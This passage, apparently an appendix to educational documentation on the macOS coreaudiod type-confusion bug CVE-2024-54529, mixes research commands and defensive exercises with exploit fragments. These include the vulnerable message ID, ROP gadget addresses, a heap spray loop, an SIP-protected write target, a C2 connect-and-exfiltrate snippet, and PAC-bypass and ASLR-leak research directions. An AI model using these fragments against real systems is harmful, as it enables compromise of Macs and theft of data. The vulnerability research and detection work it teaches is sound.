nm is FAST. Running IDA or Ghidra on a 7MB binary is slow. Start with nm to identify interesting functions, THEN disassemble those specific functions. Work smarter, not harder.

---

#### PHASE 3: GADGET COLLECTION - BUILD THE TOOLKIT

**GOAL:** Find ROP gadgets for building our payload.

```bash
$ pip3 install ROPGadget
$ ROPgadget --binary /tmp/extracted/CoreAudio > gadgets.txt
# Q: What code snippets can I chain together?
# A: 26,923 gadgets! Plenty to work with.

$ grep "add sp" gadgets.txt    # Stack adjustment gadgets
$ grep "pop rdi" gadgets.txt   # Register control gadgets (x86)
$ grep "ldr x0" gadgets.txt    # Register control gadgets (ARM64)
$ grep "ret$" gadgets.txt      # Plain returns (no PAC)
```

**WHY GREP THE GADGET FILE?**
ROPgadget outputs thousands of gadgets. We need SPECIFIC types:
- Stack pivots: `xchg rsp, rax` (x86) or `mov sp, x0` (ARM64)
- Register setters: `pop rdi` (x86) or `ldr x0` (ARM64)
- Memory operations: `mov [rdi], rax`

Searching for patterns is faster than scrolling through 26K lines.

---

#### PHASE 4: HEAP PROFILING - KNOW YOUR BATTLEFIELD

**GOAL:** Understand heap state for reliable exploitation.

```bash
$ sudo heap $(pgrep coreaudiod)
# Q: What size allocations dominate? What size is rare?
# A: 73K allocations. 1152-byte (Engine size) is rare = good!

$ sudo vmmap $(pgrep coreaudiod) | grep MALLOC
# Q: Where is the heap? How big are the zones?
# A: MALLOC_TINY at 0x104d94000, 4MB. MALLOC_SMALL nearby.

$ sudo vmmap $(pgrep coreaudiod) | grep dyld
# Q: What's the dyld cache slide for ASLR bypass?
# A: Cache at 0x20a53c000, same as our process (system-wide!)
```

**WHY HEAP ANALYSIS?**
Blind heap spraying is unreliable. If we spray the WRONG size, our data goes to a different zone than the vulnerable object. Understanding malloc zones lets us TARGET the right region.

---

#### PHASE 5: DETECTION SETUP - BLUE TEAM PERSPECTIVE

**GOAL:** Monitor for exploitation (defenders) or verify success (red).

```bash
$ log stream --predicate 'process == "coreaudiod"'
# DETECT: Unusual log messages, errors, crashes
# BASELINE: Learn what "normal" looks like first

$ sudo fs_usage -w -f filesys | grep Audio
# DETECT: Large writes to DeviceSettings.plist (heap spray!)
# DETECT: File creation outside normal paths

$ watch -n 1 'ls -la /Library/Preferences/Audio/'
# DETECT: File size changes (plist growing during spray)
# DETECT: New files appearing (exploit artifacts)
```

**WHY DETECTION AS FINAL STEP?**
- For attackers: Verify your exploit worked
- For defenders: Know what to look for in production systems
- Understanding BOTH sides makes you a better security professional.

---

### The Complete Picture

```

  RECONNAISSANCE        EXTRACTION         GADGETS         HEAP
  +----------+         +----------+       +----------+   +----------+
  | launchctl|  --->   |   ipsw   |  ---> |ROPgadget | ->|   heap   |
  | codesign |         |    nm    |       |  grep    |   |  vmmap   |
  | sandbox  |         |          |       |          |   |          |
  +----------+         +----------+       +----------+   +----------+
       |                    |                  |              |
       v                    v                  v              v
  Know privileges      Know structure     Know code        Know heap
  and constraints      and entry points   snippets         layout

  +-------------------------------------------------------------+
  |                                                             |
  |  COMBINE ALL -> BUILD EXPLOIT -> TEST -> REFINE -> SUCCESS! |
  |                                                             |
  +-------------------------------------------------------------+
```

---

## A.6 Connecting Experiments to Exploit Code

This section maps each experiment's findings to SPECIFIC lines of code in the exploit. The goal is to show that every piece of information we gathered has a CONCRETE purpose in exploitation.

### Experiment 1: launchctl print

**FINDING:** Service name is `com.apple.audio.audiohald`

**USED IN exploit.mm, in the `connectToAudioHAL()` function:**

```c
// Connect to the audiohald service
mach_port_t service_port;
kern_return_t kr = bootstrap_look_up(
    bootstrap_port,
    "com.apple.audio.audiohald",  // <-- FROM EXPERIMENT 1!
    &service_port
);
```

**WITHOUT THIS:** We wouldn't know what service name to look up. The Mach port lookup requires the EXACT registered name.

---

### Experiment 2: codesign entitlements

**FINDING:** `rootless.storage.AudioSettings` entitlement

**IMPLICATION:** After exploitation, we can write to SIP-protected paths!

**USED IN build_rop.py, choosing the file path for our proof-of-concept:**

```python
INLINE_STRING = "/Library/Preferences/Audio/malicious.txt"
#               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
# This path is SIP-protected for normal users, but coreaudiod
# has the entitlement to write here. We leverage that capability!
```

**WITHOUT THIS:** We might try to write to /tmp (sandbox blocked) or somewhere the sandbox denies. Understanding entitlements tells us what file operations will SUCCEED post-exploitation.

---

### Experiment 3: Sandbox profile

**FINDING:** `(allow network*)` in the sandbox rules

**IMPLICATION:** Post-exploitation, we have UNRESTRICTED network access!

**HOW A REAL ATTACKER WOULD USE THIS:**
Instead of our simple "create a file" proof-of-concept, they would:

```c
// In their ROP chain, call:
socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd, &attacker_c2_server, sizeof(addr));
// Now exfiltrate data or receive commands!
```

**WITHOUT THIS:** We might assume network is blocked and not bother. Knowing it's allowed changes the attack from "demo" to "weaponized".

---

### Experiments 4-5: dyld extraction + nm symbols

**FINDING:** 79 MIG handlers, class hierarchy, vulnerable function address

**USED IN multiple places:**

1. Knowing the MESSAGE ID for the vulnerable handler:
```bash
$ nm CoreAudio | grep __XIOContext_Fetch_Workgroup_Port
# Cross-reference with MIG definitions to find message ID 1010059
```

```c
// In triggerVulnerability():
mach_msg_header_t msg;
msg.msgh_id = 1010059;  // <-- FROM EXPERIMENT 5!
```

2. Understanding the object hierarchy:
```bash
$ nm CoreAudio | grep HALS_Engine
# HALS_Engine exists, has different layout than HALS_IOContext
```

```c
// In exploit logic, we create an Engine object:
engine_id = createEngineObject();  // Returns 'ngne' type object
triggerVulnerability(engine_id);   // Pass Engine ID where IOContext
                                   // is expected = TYPE CONFUSION!
```

**WITHOUT THIS:** We wouldn't know what message to send or what object types exist for the confusion.

---

### Experiment 7: ROPgadget

**FINDING:** 26,923 gadgets, including stack pivots and register setters

**USED IN build_rop.py, these addresses come from ROPgadget output:**

```python
STACK_PIVOT_GADGET  = 0x7ff810b908a4  # xchg rsp, rax ; ret
POP_RDI_GADGET      = 0x7ff80f185186  # pop rdi ; ret
POP_RSI_GADGET      = 0x7ff811fa1e36  # pop rsi ; ret
POP_RDX_GADGET      = 0x7ff811cce418  # pop rdx; ret
POP_RAX_GADGET      = 0x7ff811c93b09  # pop rax; ret
# ALL OF THESE came from searching the ROPgadget output!
```

**The process:**
```bash
$ ROPgadget --binary /tmp/extracted/CoreAudio > gadgets.txt
$ grep "xchg.*rsp" gadgets.txt   # Find stack pivots
$ grep "pop rdi" gadgets.txt     # Find RDI control
$ grep "pop rsi" gadgets.txt     # Find RSI control
# ... and so on for each register we need to control
```

**WITHOUT THIS:** No ROP chain, no code execution. Just a crash.

---

### Experiments 9-10: heap + vmmap

**FINDING:** Engine objects are 1152 bytes, MALLOC_SMALL zone

**USED IN the heap spray loop:**

```c
// Spray strings of specific size to land in same zone as Engine
#define SPRAY_STRING_SIZE 1100  // ~1152 bytes with CFString header
#define SPRAY_ITERATIONS  100
#define STRINGS_PER_ITERATION 50

for (int i = 0; i < SPRAY_ITERATIONS; i++) {
    CFMutableDictionaryRef spray_dict = CFDictionaryCreateMutable(...);
    for (int j = 0; j < STRINGS_PER_ITERATION; j++) {
        // Create string of SPRAY_STRING_SIZE bytes
        // containing our ROP chain data
        CFStringRef key = ...;
        CFDataRef value = CFDataCreate(NULL, rop_payload, 1152);
        //                                               ^^^^^
        //                                               FROM EXPERIMENT 9!
        CFDictionarySetValue(spray_dict, key, value);
    }
    // Send to coreaudiod via SetPropertyData
    sendPropertyUpdate(spray_dict);
}
```

**FINDING:** dyld shared cache at same address across processes

**USED IN:** ASLR bypass - we can calculate gadget addresses from our own process's view of the cache!

**WITHOUT THIS:** Wrong spray size = data lands in wrong zone = failure. Wrong ASLR slide = gadget addresses point to garbage = crash.

---

### The Full Picture

```
+------------------+     +--------------------------------------------+
| Experiment 1     | --> | Service name for bootstrap_look_up()      |
| launchctl        |     |                                            |
+------------------+     +--------------------------------------------+

+------------------+     +--------------------------------------------+
| Experiment 2     | --> | Know what file writes will succeed         |
| codesign         |     | (entitlements grant SIP bypass)            |
+------------------+     +--------------------------------------------+

+------------------+     +--------------------------------------------+
| Experiment 3     | --> | Know post-exploitation capabilities       |
| sandbox          |     | (network = download implant, exfil data)  |
+------------------+     +--------------------------------------------+

+------------------+     +--------------------------------------------+
| Experiments 4-5  | --> | Message IDs, function addresses, class types|
| ipsw + nm        |     | (which message triggers bug, which object) |
+------------------+     +--------------------------------------------+

+------------------+     +--------------------------------------------+
| Experiment 7     | --> | ROP gadget addresses for payload           |
| ROPgadget        |     | (each gadget controls one step of execution)|
+------------------+     +--------------------------------------------+

+------------------+     +--------------------------------------------+
| Experiments 9-10 | --> | Heap spray size, ASLR slide                |
| heap + vmmap     |     | (spray lands correctly, gadgets resolve)   |
+------------------+     +--------------------------------------------+
```

---

### The Lesson

Exploitation is not magic. It's methodical information gathering followed by precise application of that information. Each "random command" you saw in this appendix feeds directly into a specific part of the exploit.

This is what separates script kiddies from security researchers:
- **Script kiddy:** Runs exploit, doesn't understand why it works or fails
- **Researcher:** Understands every byte, can adapt when things change

When Apple patches this bug, the exploit breaks. But a researcher who understands the methodology can find ANOTHER bug and exploit THAT too, because the skills transfer. The bug is specific; the methodology is general.

---

## A.7 Tools Reference

| Tool | Install | Purpose |
|------|---------|---------|
| ipsw | `brew install blacktop/tap/ipsw` | Extract from dyld cache |
| ROPgadget | `pip3 install ROPGadget` | Find ROP gadgets |
| nm | (built-in) | List symbols |
| heap | (built-in) | Analyze heap allocations |
| vmmap | (built-in) | View memory map |
| codesign | (built-in) | View entitlements |
| launchctl | (built-in) | Query launchd services |
| log | (built-in) | Query unified logging |
| fs_usage | (built-in) | Monitor file operations |

**OPTIONAL (for deeper analysis):**
| Tool | Install | Purpose |
|------|---------|---------|
| radare2 | `brew install radare2` | Disassembly/debugging |
| Ghidra | ghidra.re | Decompilation |
| class-dump | `brew install class-dump` | Dump ObjC headers |
| ropper | `pip3 install ropper` | Alternative gadget finder |

---

## A.8 Exercises

### Beginner Exercises

#### Exercise 1: Run All Commands and Document Observations

Run every command in this appendix on your own macOS system. Document:
- Any differences in output compared to what's shown here
- Your macOS version and whether you're on Intel or Apple Silicon
- Any errors you encounter and how you resolved them

**STEPS:**
1. Work through each experiment in order (1-10)
2. Save all output to files: `experiment_1.txt`, `experiment_2.txt`, etc.
3. Write a summary comparing your results to the expected output

---

#### Exercise 2: Modify the YARA Rule for Different Patterns

Write YARA rules to detect variations of this exploit:

**Base YARA rule to modify:**
```yara
rule CoreaudiodHeapSpray {
    meta:
        description = "Detects heap spray targeting coreaudiod"
    strings:
        $plist_header = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        $large_string = /[A-Za-z0-9]{1000,}/
    condition:
        $plist_header and $large_string and filesize > 5MB
}
```

**Tasks:**
1. Modify to detect ROP gadget patterns (repeated 8-byte values)
2. Add detection for specific file paths (`/Library/Preferences/Audio/`)
3. Create a rule for detecting the type confusion crash signature in logs

---

#### Exercise 3: Capture Normal coreaudiod Activity with `log`

Establish a baseline of normal coreaudiod behavior:

**STEPS:**
1. Run: `log stream --predicate 'process == "coreaudiod"' > baseline.log` for 30 minutes during normal use
2. Play audio, use Bluetooth headphones, use AirPlay
3. Analyze the log for patterns:
   - What subsystems log most frequently?
   - What events happen when you change audio devices?
   - What's the typical log volume per minute?

**DELIVERABLE:** A report documenting "normal" that can be used to detect anomalies.

---

### Intermediate Exercises

#### Exercise 4: Write Python Script to Parse MIG Messages

Create a Python script that can decode MIG message headers:

```python
#!/usr/bin/env python3
"""
MIG Message Parser for CoreAudio
TODO: Implement message parsing
"""

import struct

# MIG message IDs for CoreAudio (from analysis)
MIG_MESSAGES = {
    1010000: "HAL_Initialize",
    1010001: "HAL_GetDeviceCount",
    1010059: "IOContext_Fetch_Workgroup_Port",  # VULNERABLE!
    # ... add more
}

def parse_mach_msg_header(data: bytes) -> dict:
    """
    Parse a Mach message header.

    struct mach_msg_header_t {
        mach_msg_bits_t       msgh_bits;
        mach_msg_size_t       msgh_size;
        mach_port_t           msgh_remote_port;
        mach_port_t           msgh_local_port;
        mach_port_name_t      msgh_voucher_port;
        mach_msg_id_t         msgh_id;
    };
    """
    # TODO: Implement this
    pass

def identify_message(msg_id: int) -> str:
    """Return the human-readable name for a MIG message ID."""
    return MIG_MESSAGES.get(msg_id, f"Unknown({msg_id})")

# TODO: Add main function that reads from file or network capture
```

**DELIVERABLE:** Working script that can parse captured MIG messages.

---

#### Exercise 5: Create Frida Script to Hook CopyObjectByObjectID

Write a Frida script to intercept the vulnerable function:

```javascript
// frida-coreaudiod.js
// Hook CopyObjectByObjectID to observe type confusion

// TODO: Find the actual address - this is placeholder
const CopyObjectByObjectID = Module.findExportByName(
    "CoreAudio",
    "_HALS_ObjectMap_CopyObjectByObjectID"
);

if (CopyObjectByObjectID) {
    Interceptor.attach(CopyObjectByObjectID, {
        onEnter: function(args) {
            console.log("[*] CopyObjectByObjectID called");
            console.log("    object_id: " + args[1]);
            // TODO: Print the object type
        },
        onLeave: function(retval) {
            console.log("    returned object: " + retval);
            // TODO: Read and print the type field from the object
        }
    });
}
```

**STEPS:**
1. Install Frida: `pip3 install frida-tools`
2. Find the correct symbol name using nm
3. Implement the hooks to log object types
4. Run against coreaudiod: `frida -n coreaudiod -l frida-coreaudiod.js`

---

#### Exercise 6: Build Heap Spray Timeline Visualization

Create a visualization showing how heap allocations change over time during exploitation:

**STEPS:**
1. Write a script that periodically runs `heap $(pgrep coreaudiod)` and parses output
2. Track allocation counts for the 1152-byte size class
3. Generate a timeline graph showing:
   - Normal state (before spray)
   - During heap spray (allocations increasing)
   - After free (holes created)
   - After exploitation (new allocations in holes)

**TOOLS:** Python + matplotlib, or any data visualization tool of your choice.

---

### Advanced Exercises

#### Exercise 7: Find the 6 Vulnerable Handlers Through Static Analysis

The bug affects `__XIOContext_Fetch_Workgroup_Port`. We know there are 16 other `__XIOContext_*` handlers. How many are also vulnerable?

**STEPS:**
1. List all IOContext handlers:
   ```bash
   $ nm /tmp/extracted/CoreAudio | grep __XIOContext
   ```
2. For each handler, disassemble and check:
   - Does it call `CopyObjectByObjectID()`?
   - Does it validate the object type BEFORE using offset 0x68?
3. Document which handlers are safe vs. vulnerable

**EXPECTED:** You should find 6 vulnerable handlers total (as Apple patched)

**DELIVERABLE:** A table showing each handler and its vulnerability status.

---

#### Exercise 8: Write Coverage-Guided Harness for Different MIG Service

Create a fuzzing harness for a DIFFERENT Mach service (not coreaudiod):

**Suggested targets:**
- `com.apple.windowserver` - Window server
- `com.apple.coreservices.launchservicesd` - Launch services
- `com.apple.locationd` - Location daemon

**STEPS:**
1. Use `launchctl list` to find interesting services
2. Identify their MIG interfaces using nm
3. Write a harness that:
   - Connects to the service
   - Sends fuzzed MIG messages
   - Tracks code coverage (using LLVM SanitizerCoverage or similar)

---

#### Exercise 9: Develop ASLR Information Leak

The current exploit relies on system-wide dyld cache slide. Develop an independent information leak:

**Research directions:**
1. Find an object that contains a vtable pointer
2. Leak that pointer through a side channel or error message
3. Calculate the cache slide from the leaked value

**Hint:** Look for functions that return error messages containing addresses, or timing side channels based on valid vs. invalid pointer dereferences.

---

### Expert Exercises

#### Exercise 10: Design ARM64 Variant (Theoretical)

This exploit targets x86_64. Design (on paper) an ARM64 (Apple Silicon) variant.

**CHALLENGES:**
1. Different register conventions (x0-x7 for args, x30 for LR)
2. Pointer Authentication (PAC) - you need PAC bypass or signing
3. Different gadget patterns (ARM64 instructions are fixed width)
4. Different syscall ABI (svc #0x80, syscall number in x16)

**RESEARCH STARTING POINTS:**
- Apple's PAC implementation has known weaknesses
- Some gadgets don't use authenticated returns
- JIT regions might have weaker PAC enforcement

**DELIVERABLE:** A design document describing:
- Which PAC bypass technique you would use
- What gadgets you would need
- How the ROP chain would differ

---

#### Exercise 11: Find New Type Confusion in Same Codebase

The pattern that caused CVE-2024-54529 may exist elsewhere in CoreAudio:

**Pattern to search for:**
1. Function takes an `object_id` parameter
2. Calls `CopyObjectByObjectID()` to get an object
3. Uses the object WITHOUT checking its type
4. Assumes specific fields exist at specific offsets

**STEPS:**
1. Disassemble all `__X*` handlers in CoreAudio
2. Look for the pattern above
3. Document any potential new vulnerabilities

**NOTE:** If you find real vulnerabilities, follow responsible disclosure to Apple Security at https://developer.apple.com/security-bounty/

---

#### Exercise 12: Write Kernel-Level Detector

Create a kernel extension or DriverKit driver that detects exploitation attempts:

**Detection points:**
1. Hook `mach_msg` to detect anomalous message patterns to coreaudiod
2. Monitor for unusually large plist allocations
3. Detect ROP-like execution patterns (many small returns in sequence)

**Modern approach using Endpoint Security Framework:**
```c
// ES_EVENT_TYPE_NOTIFY_MACH_MSG - Monitor Mach messages
// ES_EVENT_TYPE_NOTIFY_EXEC - Detect spawned processes
// ES_EVENT_TYPE_NOTIFY_WRITE - Detect file writes
```

**DELIVERABLE:** Working detection code with documentation.

---

## Navigation

[<< Back to Main Documentation](./README.md) | [Next: Appendix B >>](./appendix-b.md)

---

*This appendix is part of the CVE-2024-54529 educational documentation.*
